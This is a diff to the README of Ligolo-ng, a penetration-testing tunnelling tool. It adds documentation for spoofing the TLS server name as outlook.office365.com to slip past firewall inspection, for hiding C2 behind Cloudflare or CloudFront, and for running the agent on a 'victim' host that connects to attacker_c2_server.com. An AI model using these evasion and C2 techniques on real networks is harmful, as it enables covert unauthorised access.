@@ -32,6 +32,7 @@ You use Ligolo-ng for your penetration tests? Did it help you pass a certificati
     - [Using Let's Encrypt Autocert](#using-lets-encrypt-autocert)
     - [Using your own TLS certificates](#using-your-own-tls-certificates)
     - [Automatic self-signed certificates (NOT RECOMMENDED)](#automatic-self-signed-certificates-not-recommended)
+    - [Alter Serve name](#using-alter-servername)
   - [Using Ligolo-ng](#using-ligolo-ng)
   - [Agent Binding/Listening](#agent-bindinglistening)
   - [Access to agent's local ports (127.0.0.1)](#access-to-agents-local-ports-127001)
@@ -138,16 +139,36 @@ The *proxy/relay* can automatically generate self-signed TLS certificates using 
 The `-ignore-cert` option needs to be used with the *agent*.
 
 > Beware of man-in-the-middle attacks! This option should only be used in a test environment or for debugging purposes.
+
+#### Using alter ServerName
+
+When agent connects to IP address (not by domain name) TLS ClientHello packet will NOT contain SNI (ServeName) field. This is not usual case and can be triggered by proxy, firewall, etc.
+To avoid this agent must use some TLS servername. You can use param -sname when angent connect to IP-address: `-sname blabla.com`.
+You can use sname even when you connect agent to your domain. This can be useful when you're trying to trick firewall that blocks unknown or low-level domains.
+For example:
+```shell 
+agent -v -ignore-cert -sname outlook.office365.com -connect https://c2.yourdomain.blbla.com
+```
+In this example agent will connect to your C2 domain but use outlook.office365.com domain in TLS packets. 
+P.S. Ms Office domains are in TLS-mitm bypass lists in all modern firewalls ;)
+Of cource, this feature doesn't work when your domain is behind CDN.
+
 ### Using Ligolo-ng
 
 
 Start the *agent* on your target (victim) computer (no privileges are required!):
 
+Direct connection to server
 ```shell
 $ ./agent -connect attacker_c2_server.com:11601
 ```
 
-> If you want to tunnel the connection over a SOCKS5 proxy, you can use the `--socks ip:port` option. You can specify SOCKS credentials using the `--socks-user` and `--socks-pass` arguments.
+Websocket connection to server. You can hide your C2 behind Cloudflare or AWS Cloudfront
+```shell
+$ ./agent -connect https://attacker_c2_server.com
+$ ./agent -connect https://attacker_c2_server.com:8443
+```
+> If you want to tunnel the connection over a proxy, you can use the `--proxy` option. You have to use `--proxy http://username:password@ip:port` with websocket or `--proxy socks://username:password@IP:port` with dicrect connection.
 
 A session should appear on the *proxy* server.
 
@@ -202,6 +223,9 @@ Start the tunnel on the proxy:
 [Agent : nchatelain@nworkstation] » start_tunnel
 [Agent : nchatelain@nworkstation] » INFO[0690] Starting tunnel to nchatelain@nworkstation   
 ```
+
+> If you want to enable auto-starting tunnel when agent is coming (ex: when agent reconnects) you can pass auto-start parameter:`-autostart <dev-name>` to proxy
+
 
 You can also specify a custom tuntap interface using the ``--tun iface`` option:
 
